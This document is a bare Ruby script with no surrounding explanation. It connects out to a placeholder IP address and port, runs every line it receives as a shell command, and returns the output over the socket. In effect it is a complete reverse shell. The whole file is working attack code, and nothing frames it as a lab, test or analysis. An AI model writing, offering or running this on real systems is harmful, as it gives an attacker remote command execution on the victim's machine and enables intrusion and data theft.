require 'socket'

ip = 'your_ip_address'
port = your_port_number

socket = TCPSocket.new(ip, port)

while line = socket.gets
  output = `#{line}`
  socket.puts(output)
end

socket.close

